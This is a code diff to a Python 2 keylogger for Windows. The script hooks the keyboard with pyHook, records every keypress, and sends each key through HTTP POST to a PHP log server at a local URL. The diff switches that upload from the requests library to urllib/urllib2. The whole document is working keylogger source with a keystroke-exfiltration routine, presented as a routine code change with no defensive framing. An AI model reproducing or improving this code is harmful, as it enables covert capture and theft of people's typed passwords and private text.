@@ -13,8 +13,8 @@ import pythoncom
 import pyHook
 import win32clipboard
 import sys
-# Temp module
-import requests
+import urllib
+import urllib2
 
 # URL to PHP Server to transfer logs.
 log2url = 'http://127.0.0.1:7777/log/index.php'
@@ -28,20 +28,15 @@ charRep = 'X'
 # Main Routine
 def Main():
 
-	# Enable access to c globally.
-	global c
 	# Enable access to toPHP globally.
 	global toPHP
 
-	# Shorten method identifier..
-	with requests.Session() as c:
-
-		# Create hook
-		kl = pyHook.HookManager()
-		kl.KeyDown = KeyIN
-		# Register hook and register
-		kl.HookKeyboard()
-		pythoncom.PumpMessages()
+	# Create hook
+	kl = pyHook.HookManager()
+	kl.KeyDown = KeyIN
+	# Register hook and register
+	kl.HookKeyboard()
+	pythoncom.PumpMessages()
 
 
 # Key input function
@@ -54,7 +49,7 @@ def KeyIN(event):
 	toPHP = \
 	{
 		# Data to send (Key, Input) ->
-		'Key' : charRep,
+		'Key' : charRep
 	}
 
 	# Detect letter AND numerical keys
@@ -69,11 +64,15 @@ def KeyIN(event):
 
 	# Detect special input such as Tab, Shift, etc..
 	else:
-		print " [%s] " % event.Key,
-		charRep = " [%s] " % event.Key,
+		print "[%s]" % event.Key,
+		charRep = "[%s]" % event.Key,
 
 	# Send key to PHP file.
-	c.post(log2url, params=toPHP)
+	data = urllib.urlencode(toPHP)
+	req = urllib2.Request(log2url, data)
+	response = urllib2.urlopen(req)
+	the_page = response.read()
+	print the_page
 
 	# Return to hook
 	return True
